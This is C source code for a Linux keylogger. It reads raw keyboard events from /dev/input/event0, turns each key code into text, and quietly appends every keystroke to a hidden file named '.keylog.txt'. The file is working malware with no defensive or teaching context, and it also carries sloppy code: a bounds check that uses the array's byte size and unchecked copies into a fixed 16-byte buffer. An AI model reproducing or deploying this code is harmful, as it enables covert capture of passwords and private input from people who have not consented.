#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <linux/input.h>
#include <string.h>

char *getKey(int code){
	char *codes[] = {"\n[ESC]\n"
			
			,"1","2","3","4","5","6","7","8","9","0","-","=",

			"\n[BS]\n","\n[TAB]\n",

			"q","w","e","r","t","y","u","i","o","p","[","]","\n[ENTER]\n",
	
			"\n[LCONTROL]\n",
		
			"a","s","d","f","g","h","j","k","l",";","\'","`",
			
			"\n[LSHIFT]\n",

			"\\","z","x","c","v","b","n","m",",",".","/",

			"\n[RSHIFT]\n",

			"*",

			"\n[LALT]\n",

			" ",

			"\n[CAPS]\n",

			"\n[<F1>]\n","\n[<F2>]\n","\n[<F3>]\n","\n[<F4>]\n","\n[<F5>]\n",

			"\n[<F6>]\n","\n[<F7>]\n","\n[<F8>]\n","\n[<F9>]\n","\n[<F10>]\n",

			"\n[NUMLOCK]\n","\n[SCROLLLOCK]\n","\n[HOME]\n","\n[UP]\n","\n[PGUP]\n",

			"-",

			"\n[LEFT]\n",

			"5",

			"\n[RIGHT]\n","\n[+]\n","\n[END]\n","\n[DOWN]\n","\n[PGDOWN]\n","\n[INS]\n","\n[DEL]\n",

			"\n[NULL]\n","\n[NULL]\n","\n[NULL]\n",

			"\n[<F11>]\n","\n[<F12>]\n",

			"\n[NULL]\n","\n[NULL]\n","\n[NULL]\n","\n[NULL]\n","\n[NULL]\n","\n[NULL]\n","\n[NULL]\n",

			"\n[Enter]\n",

			"\n[RCONTROL]\n",

			"/",

			"\n[PRINT]\n","\n[RALT]\n",

			"\n[NULL]\n",

			"\n[Home]\n","\n[Up]\n","\n[PgUp]\n",

			"\n[Left]\n","\n[Right]\n","\n[End]\n","\n[Down]\n",

			"\n[PgDn]\n","\n[Insert]\n","\n[Del]\n",

			"\n[NULL]\n","\n[NULL]\n","\n[NULL]\n","\n[NULL]\n","\n[NULL]\n","\n[NULL]\n","\n[NULL]\n",

			"\n[Pause]\n"};
	
	if(code < (int)sizeof(codes)){
		return codes[code - 1];
	}
	else{
		return "[NULL]";
	}
}

int main(){
	int sourceFD = open("/dev/input/event0", O_RDONLY);
	int outputFD = open(".keylog.txt", O_WRONLY | O_CREAT | O_APPEND);

        struct input_event ev;

	char buff[16];

	while(1){
		read(sourceFD, &ev, sizeof(struct input_event));

		if(ev.type==1 && ev.value==1){
			strcpy(buff, getKey(ev.code));	
			write(outputFD, buff, sizeof(buff));
			memset(buff, 0, sizeof(buff));
		}
	}
}
